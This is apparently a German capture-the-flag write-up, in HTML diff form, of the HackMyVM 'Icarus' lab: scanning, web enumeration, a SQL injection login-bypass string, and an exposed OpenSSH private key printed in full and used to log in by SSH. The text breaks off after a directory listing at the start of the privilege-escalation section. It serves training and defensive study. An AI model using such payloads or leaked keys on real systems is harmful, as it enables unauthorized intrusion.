@@ -1,0 +1,597 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Icarus - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Icarus - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Das 'style'-Attribut wurde entfernt. Die Farbe Rot muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Rot) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">gcc</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.111	08:00:27:71:02:f7	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>arp-scan -l</code> sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen Adressen im lokalen Netzwerksegment, um aktive Hosts zu identifizieren. Das Ergebnis zeigt, dass die IP-Adresse <code>192.168.2.111</code> aktiv ist und die MAC-Adresse <code>08:00:27:71:02:f7</code> hat, welche Oracle (VirtualBox) zugeordnet ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist fundamental für die Erkundung des lokalen Netzwerks. Die Identifizierung der Ziel-IP <code>192.168.2.111</code> ist der erste Erfolg und die notwendige Voraussetzung für alle weiteren Scans und Angriffsversuche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem das Ziel identifiziert wurde, sollte ein detaillierter Portscan (z.B. mit Nmap) durchgeführt werden, um offene Ports und laufende Dienste auf dem Zielsystem zu finden.<br><strong>Empfehlung (Admin):</strong> Überwachung des Netzwerks auf ungewöhnliche ARP-Aktivitäten. Implementierung von Netzwerksegmentierung kann die Reichweite solcher Scans einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-12 01:29 CET
+Nmap scan report for icarus (192.168.2.111)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 b66556408da857b9151e0e1fa5d0523a (RSA)
+|   256 7965cb2a068213d3766b1c55cd8f07b7 (ECDSA)
+|_  256 b134e521a02830c06c010eb07b8fb8c6 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: LOGIN
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:71:02:F7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms icarus (192.168.2.111)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Nmap-Befehl führt einen umfassenden Scan auf dem Ziel <code>192.168.2.111</code> durch:
+                <ul>
+                    <li><code>-sS</code>: SYN-Scan (Stealth Scan), schnell und weniger auffällig.</li>
+                    <li><code>-sC</code>: Führt Standard-Nmap-Skripte zur Diensterkennung und Schwachstellenprüfung aus.</li>
+                    <li><code>-T5</code>: Stellt das Timing auf "Insane" für einen sehr schnellen Scan (kann ungenau sein oder entdeckt werden).</li>
+                    <li><code>-A</code>: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.</li>
+                    <li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li>
+                </ul>
+                Die Ergebnisse zeigen zwei offene Ports: Port <code>22</code> mit OpenSSH 7.9p1 und Port <code>80</code> mit einem nginx 1.14.2 Webserver (Titel: LOGIN). Das Betriebssystem wird als Linux (Kernel 4.x/5.x) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan liefert kritische Informationen über die Angriffsfläche des Ziels. Die offenen Ports SSH und HTTP sind die primären Einstiegspunkte. Die spezifischen Versionen (OpenSSH 7.9p1, nginx 1.14.2) sind wichtig für die Suche nach bekannten Schwachstellen. Die Debian-Basis von SSH gibt weitere Systemkontext.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Webserver auf Port 80 genauer untersuchen (Verzeichnisse, Dateien, Webanwendungen, Schwachstellen). SSH auf schwache Anmeldedaten oder bekannte Exploits für die Version 7.9p1 prüfen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige Ports offen sind. SSH sollte idealerweise nur mit Key-Authentifizierung erlaubt sein und die Version aktuell gehalten werden. Webserver und Betriebssystem regelmäßig patchen. Firewall-Regeln überprüfen und härten.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.111 -x txt,php,rar,zip,tar,pem,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n</span></div>
+                    <pre>
+<span class="command">http://192.168.2.111/index.php</span>            [Size: 407]
+<span class="command">http://192.168.2.111/login.php</span>            [Size: 0] [--> index.php]
+<span class="command">http://192.168.2.111/xml</span>                  [Size: 1]
+<span class="command">http://192.168.2.111/a</span>                    [Size: 9641]
+<span class="command">http://192.168.2.111/xxx</span>                  [Size: 1]
+<span class="command">http://192.168.2.111/check.php</span>            [Size: 21]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden.
+                <ul>
+                    <li><code>dir</code>: Modus für Verzeichnis-/Datei-Bruteforce.</li>
+                    <li><code>-u http://192.168.2.111</code>: Ziel-URL.</li>
+                    <li><code>-x ...</code>: Liste von Dateiendungen, nach denen gesucht wird.</li>
+                    <li><code>-w ...</code>: Wortliste für Verzeichnis-/Dateinamen.</li>
+                    <li><code>-b '403,404'</code>: Statuscodes, die nicht als "gefunden" angezeigt werden sollen.</li>
+                    <li><code>-e</code>: Erweiterter Modus, zeigt die vollständige URL an.</li>
+                    <li><code>-t 100</code>: Anzahl der Threads (sehr hoch).</li>
+                    <li><code>-n</code>: Statuscodes nicht anzeigen.</li>
+                </ul>
+                Es wurden mehrere Pfade gefunden, darunter <code>/a</code> mit einer auffällig großen Dateigröße, <code>/xml</code>, <code>/xxx</code>, sowie die PHP-Dateien <code>index.php</code>, <code>login.php</code> (leitet weiter) und <code>check.php</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die gefundenen Pfade sind vielversprechend. Insbesondere <code>/a</code> und <code>/xml</code> könnten interessante Informationen enthalten. <code>login.php</code> bestätigt die Authentifizierungsfunktion, die bereits im Seitentitel vermutet wurde. <code>check.php</code> könnte eine interne Funktion offenlegen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Pfade und Dateien manuell im Browser aufrufen und analysieren. Insbesondere den Inhalt von <code>/a</code> untersuchen. Die Funktionsweise von <code>check.php</code> und <code>/xml</code> prüfen.<br><strong>Empfehlung (Admin):</strong> Unnötige Dateien und Verzeichnisse vom Webserver entfernen. Zugriff auf sensible Bereiche einschränken. Directory Listing deaktivieren. Bruteforce-Angriffe durch Rate-Limiting oder Intrusion Detection Systeme erschweren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.111</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        80
++ Start Time:         2022-11-12 01:30:28 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Cookie PHPSESSID created without the httponly flag</span>
++ 7915 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2022-11-12 01:30:39 (GMT1) (11 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto ist ein Webserver-Scanner, der nach bekannten Schwachstellen, Konfigurationsfehlern und interessanten Dateien sucht. Der Scan gegen <code>192.168.2.111</code> identifiziert mehrere fehlende HTTP-Security-Header:
+                <ul>
+                    <li><code>X-Frame-Options</code>: Schützt vor Clickjacking-Angriffen.</li>
+                    <li><code>X-XSS-Protection</code>: Bietet einen einfachen Schutz gegen Cross-Site-Scripting (obwohl veraltet, besser ist eine Content Security Policy).</li>
+                    <li><code>X-Content-Type-Options</code>: Verhindert MIME-Type-Sniffing.</li>
+                </ul>
+                Außerdem wird festgestellt, dass das Session-Cookie (<code>PHPSESSID</code>) ohne das <code>HttpOnly</code>-Flag gesetzt wird, was es anfällig für Diebstahl durch clientseitige Skripte (XSS) macht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Funde deuten auf mangelnde Sicherheitskonfigurationen des Webservers hin. Das Fehlen der Header und des HttpOnly-Flags erhöht das Risiko verschiedener Web-Angriffe, insbesondere wenn andere Schwachstellen wie XSS gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Konfigurationsschwächen notieren. Sie können später in Kombination mit anderen Schwachstellen ausgenutzt werden (z.B. Session-Hijacking bei erfolgreichem XSS).<br><strong>Empfehlung (Admin):</strong> Die fehlenden HTTP-Security-Header (<code>X-Frame-Options: DENY/SAMEORIGIN</code>, <code>X-Content-Type-Options: nosniff</code>, <code>Content-Security-Policy</code>) in der nginx-Konfiguration hinzufügen. Das <code>HttpOnly</code>-Flag für Session-Cookies in der PHP-Konfiguration (<code>session.cookie_httponly = 1</code>) aktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.111 -I</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Sat, 12 Nov 2022 00:31:06 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>curl -I</code> sendet eine HEAD-Anfrage an die angegebene URL und zeigt nur die HTTP-Header der Antwort an. Dies bestätigt, dass der Server erreichbar ist (<code>HTTP/1.1 200 OK</code>) und die von Nmap und Nikto gemeldete Server-Software (<code>nginx/1.14.2</code>) verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl liefert eine schnelle Bestätigung der Server-Erreichbarkeit und der grundlegenden Header-Informationen. Er liefert hier keine neuen Erkenntnisse im Vergleich zu den vorherigen Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützlich für schnelle Checks oder Skripting, aber für eine detaillierte Enumeration sind Tools wie Nmap, Gobuster und Nikto aussagekräftiger.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich, dient der Verifizierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.111 -Iv</span></div>
+                    <pre>
+*   Trying 192.168.2.111:80...
+* <span class="password">Connected to 192.168.2.111 (192.168.2.111) port 80 (#0)</span>
+> HEAD / HTTP/1.1
+> Host: 192.168.2.111
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Sat, 12 Nov 2022 00:31:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: keep-alive
+<
+* Connection #0 to host 192.168.2.111 left intact
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>curl -Iv</code> ist ähnlich wie <code>-I</code>, aber <code>-v</code> (verbose) gibt zusätzlich detaillierte Informationen über den Verbindungsaufbau und die gesendeten/empfangenen Header aus (Zeilen, die mit <code>*</code>, <code>></code> oder <code><</code> beginnen). Man sieht hier die Anfrage (<code>> HEAD / HTTP/1.1</code>) und die Antwort-Header (<code>< ...</code>), sowie die Bestätigung der erfolgreichen Verbindung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die verbose-Ausgabe ist nützlich für Debugging-Zwecke oder um genau zu sehen, welche Anfrage gesendet wurde. In diesem Fall bestätigt sie die vorherigen Ergebnisse ohne neue kritische Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden, wenn detaillierte Verbindungs- oder Header-Informationen benötigt werden, z.B. beim Testen von spezifischen Header-Manipulationen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt im Originaltext -->
+                    <pre>
+http://192.168.2.111/
+admin' OR 1=1-- -
+=
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Zeilen scheinen kein direkter Befehl oder eine Ausgabe zu sein, sondern eher eine Notiz oder der Inhalt einer Eingabe, möglicherweise in einem Webformular auf der Seite <code>http://192.168.2.111/</code>. Der String <code>admin' OR 1=1-- -</code> ist ein klassischer Versuch einer SQL-Injection, um eine Authentifizierung zu umgehen. Die nachfolgenden <code>=</code> könnten Artefakte der Eingabe oder Ausgabe sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies deutet darauf hin, dass versucht wurde, eine SQL-Injection-Schwachstelle auf der Login-Seite auszunutzen. Ohne weitere Informationen über die Reaktion des Servers kann nicht gesagt werden, ob der Versuch erfolgreich war.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SQL-Injection-Versuche systematisch mit Tools wie SQLMap durchführen oder manuelle Tests verfeinern, um die Serverantwort zu analysieren. Auf Fehlermeldungen oder unerwartetes Verhalten achten.<br><strong>Empfehlung (Admin):</strong> Serverseitige Eingabevalidierung und -sanitisierung implementieren. Parametrisierte Abfragen (Prepared Statements) verwenden, um SQL-Injection grundsätzlich zu verhindern.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.111/a" > url</span></div>
+                    <!-- Keine direkte Ausgabe dieses Befehls im Originaltext -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit diesem Befehl wird der Inhalt der zuvor von Gobuster entdeckten Ressource <code>/a</code> auf dem Zielserver heruntergeladen und in eine lokale Datei namens <code>url</code> gespeichert. Die große Dateigröße, die Gobuster gemeldet hat, machte diesen Pfad besonders interessant.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Herunterladen des Inhalts von <code>/a</code> ist ein logischer nächster Schritt nach der Web-Enumeration. Der Inhalt dieser Datei ist entscheidend für den weiteren Verlauf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der heruntergeladenen Datei <code>url</code> sorgfältig analysieren.<br><strong>Empfehlung (Admin):</strong> Überprüfen, warum potenziell sensible Informationen (wie sich später herausstellt) über einen Webserverpfad zugänglich sind. Zugriffskontrollen auf Dateiebene und Webserver-Konfiguration prüfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">for i in $(cat url); do curl "http://192.168.2.111/$i" >> curl.output; done</span></div>
+                    <!-- Keine direkte Ausgabe dieses Befehls im Originaltext -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist eine Bash-For-Schleife. Sie liest jede Zeile aus der zuvor erstellten Datei <code>url</code> (angenommen, jede Zeile enthält einen Pfad/Dateinamen). Für jede gelesene Zeile (<code>$i</code>) wird <code>curl</code> ausgeführt, um die entsprechende Ressource vom Zielserver (<code>http://192.168.2.111/$i</code>) herunterzuladen. Die Ausgabe aller curl-Aufrufe wird an die Datei <code>curl.output</code> angehängt (<code>>></code>).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Schleife automatisiert das Herunterladen mehrerer Ressourcen, deren Pfade vermutlich in der Datei <code>/a</code> (jetzt <code>url</code>) standen. Dies ist effizienter als das manuelle Herunterladen jeder einzelnen Ressource.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der resultierenden Datei <code>curl.output</code> analysieren, da sie die aggregierten Daten der heruntergeladenen Ressourcen enthält.<br><strong>Empfehlung (Admin):</strong> Überwachung auf automatisierte Anfragen und Massen-Downloads vom Webserver. Rate Limiting kann solche Aktivitäten verlangsamen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat curl.output</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA5xagxLiN5bhPjNcs2I2ckcYrErKaunwm40kTBnJ6vrbdRYHteS
+afNWC6xFFzw77+Kze229eK4ddZcwmU0IdN02Y8nYrxhl8lc+e5T0Ajz+tRmLGoxJVPsS
+TzKBERlWpKuJoG/CEFLv6PP6s79YYzZFpdUjaczY96jgICftzNZS+VkBXuLjKr79h4Tw
+z7BK4V6FEQY0hwT8NFfNrF3x3VPe0UstdiUJFl4QV/qAPlHVhPd0YUEPr/95mryjuGi1xw
+P7xVFrYyjLfPepqYHiS5LZxFewLWhhSjBI0dzf/TwiNRnVGTZhB3GemgEIQRAam26jkZZ
+3BxkrUVckQAAA8jfk7Jp35yaQAAAAdzc2gtcnNhAAABAQDnFqDEuI3k5uE+M1yzYjZyRx
+isSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydi
+vGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzN
+j3qAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX
++oA+UdWE93RhQQ+v/3mavK4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9P
+CI1GdUZNmEHcZ6aAQhBEBqbbqRlncHGStRVyRAAAAAwEAAQAAAQEAvdjwMU1xfTlUmPY3
+VUP9ePsBwSIck6ML8t35H8KFLKln3C4USxpNNe/so+BeTo1PtBVHYpDFu9IMvrl7+qW3q
+dLGyUpdUtQXhPK+RvJNt30GwB+BEUlpQYCW9SuHr1WCwfwPMA5iNdT2ijvx0ZvKwZYECJ
+DYlB87yQDz7VCnRTiQGP2Mqiiwb7vPd/t386Y+cAz1cVl7BnHzWWJTUTkKCwijnvjYrD0o
+tTQX4sGd6CrI44g+L8hnYuCZz+a0j6IyUfXJqj6l+/Z2Af7pJjbJD3P28xX7eY0h1Cec2l
+/sb7qg2wy0qJNywJ35l8bZzZKjkXztPLqMFQ6Fh0BqSdQAAAIEAlaH0ZEzJsZoR3QqcKl
+xRKjVcuQCwcrKlNbJu2qRuUG812CLb9jJxJxacJPBV0NS832c+hZ3BiLtA5FwCiGlGq5m5
+HS3odf3lLXDfIK+pur4WKBNLDxKbqi4s4M05vR4gHkmotiH9eWlCNuqL46Ip5H1vFXeJM
+pLRLN0gqGuQQAAACBAPfffuhidAgUZH/yTvATKC5lcGrE7bkpq+6XMMgxEQl0Hzry76i
+rGXkhTY4QUtthYo4+g7jiDzKlbeaS7aN8RYq38GzQnZZQcSdvL1yB/N554gQvzJLvmKQbm
+gLhMRcdDmifUelJYXib2Mjg/BLaRXaEzomUKR2nyJH7VgU+xzAAAAgQDuqkBp44indqhx
+wrzbfeLnzQqpZ/rMZXGcvJUttECRbLRfohUftFE5J0PKuT8w0dpacNCVgkT9A0Tc3xRfky
+ECBQjeKLvdhcufJhQl0pdXDt1cpebE50LE4yHc8vR6FEjhR4P2AbGICJyRS7AX7UnrWdU
+IE3FeNP0r5UiSDq16wAAAA1pY2FydXNAaWNhcnVzAQIDBA
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe der Datei <code>curl.output</code> zeigt einen privaten SSH-Schlüssel im OpenSSH-Format. Am Ende des Schlüssels befindet sich der Kommentar `icarus@icarus`, der normalerweise den Benutzer und Host angibt, für den der Schlüssel generiert wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund! Der Besitz eines privaten SSH-Schlüssels ermöglicht potenziell den direkten Login auf dem Zielsystem als der zugehörige Benutzer (hier vermutlich `icarus`) ohne ein Passwort zu benötigen. Das Auffinden eines privaten Schlüssels, der über einen Webserver zugänglich ist, stellt eine schwerwiegende Sicherheitslücke dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Schlüssel in einer Datei speichern (z.B. `icarsa`). Die Berechtigungen der Schlüsseldatei korrekt setzen (<code>chmod 600 icarsa</code>). Den Benutzernamen aus dem Kommentar extrahieren oder bestätigen. Versuchen, sich per SSH mit diesem Schlüssel auf dem Zielsystem einzuloggen.<br><strong>Empfehlung (Admin):</strong> Sofort untersuchen, wie dieser private Schlüssel auf den Webserver gelangen und zugänglich gemacht werden konnte. Den Schlüssel widerrufen und ersetzen. Sicherstellen, dass private Schlüssel niemals über Webserver oder andere unsichere Kanäle verteilt werden. Zugriffskontrollen und Konfigurationen überprüfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kommentar im Originaltext -->
+                     <!-- # Ein Trick um den User eines SSH Keys auszugeben -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist ein Kommentar im ursprünglichen Bericht, der den Zweck des nächsten Befehls erklärt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Kommentar ist hilfreich, um den folgenden Schritt zu verstehen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gute Praxis, Befehle oder Techniken im Bericht zu kommentieren.<br><strong>Empfehlung (Admin):</strong> Zur Kenntnis nehmen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keygen -y -f icarsa</span></div>
+                    <pre>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1
+Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVak
+q4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfH
+dU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavK4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/
+9PCI1GdUZNmEHcZ6aAQhBEBqbbqRlncHGStRVyR <span class="password">icarus@icarus</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ssh-keygen -y -f icarsa</code> liest den privaten SSH-Schlüssel aus der Datei <code>icarsa</code> und gibt den zugehörigen öffentlichen Schlüssel auf der Standardausgabe aus. Ein nützlicher Nebeneffekt ist, dass auch der Kommentar am Ende des öffentlichen Schlüssels ausgegeben wird, der oft den Benutzernamen enthält (hier `icarus@icarus`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl bestätigt effektiv den Benutzernamen `icarus`, der zu dem gefundenen privaten Schlüssel gehört. Dies ist eine wichtige Information für den SSH-Login-Versuch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den bestätigten Benutzernamen `icarus` zusammen mit dem privaten Schlüssel `icarsa` für den SSH-Login verwenden.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass Kommentare in öffentlichen Schlüsseln keine zu sensiblen Informationen preisgeben (obwohl der Benutzername hier weniger kritisch ist als der Schlüssel selbst).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i icarsa icarus@icarus</span></div>
+                    <pre>
+The authenticity of host 'icarus (192.168.2.111)' can't be established.
+ED25519 key fingerprint is SHA256:660u5ypkdYgsNIlyihIzWKWZ4ybowDRXYgPzokVbtTI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'icarus' (ED25519) to the list of known hosts.
+Linux icarus 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct 31 10:13:56 2020 from 192.168.1.58
+<span class="password">icarus@icarus:~$</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl versucht, eine SSH-Verbindung zum Host `icarus` (der sich zu 192.168.2.111 auflöst) als Benutzer `icarus` herzustellen, wobei der private Schlüssel aus der Datei `icarsa` (<code>-i icarsa</code>) zur Authentifizierung verwendet wird. Da der Host-Schlüssel des Servers noch nicht bekannt ist, fragt SSH nach Bestätigung (`yes`). Nach der Bestätigung wird der Login erfolgreich durchgeführt, und wir erhalten eine Shell-Prompt als Benutzer `icarus` auf dem Zielsystem (`icarus@icarus:~$`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Grandios! Der Initial Access zum Zielsystem war erfolgreich. Durch die Ausnutzung des über den Webserver preisgegebenen privaten SSH-Schlüssels konnte eine Shell als Benutzer `icarus` erlangt werden. Dies ist ein bedeutender Meilenstein im Pentest.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Umgebung als Benutzer `icarus` erkunden. Nach weiteren Informationen, Konfigurationsdateien und insbesondere nach Möglichkeiten zur Privilegieneskalation (Erlangung von Root-Rechten) suchen. Den User-Flag finden.<br><strong>Empfehlung (Admin):</strong> Die Ursache für den kompromittierten SSH-Schlüssel beheben (siehe vorherige Empfehlung). Überprüfen, welche Aktionen der Angreifer als Benutzer `icarus` durchführen konnte. SSH-Zugänge überwachen.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">icarus@icarus:~$ <span class="command">ls</span></div>
+                    <pre>
+flag.sh  user.txt
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ls</code> wird in der neu erlangten Shell ausgeführt, um den Inhalt des Home-Verzeichnisses des Benutzers `icarus` aufzulisten. Es werden zwei Dateien gefunden: <code>flag.sh</code> und <code>user.txt</code>.</p>
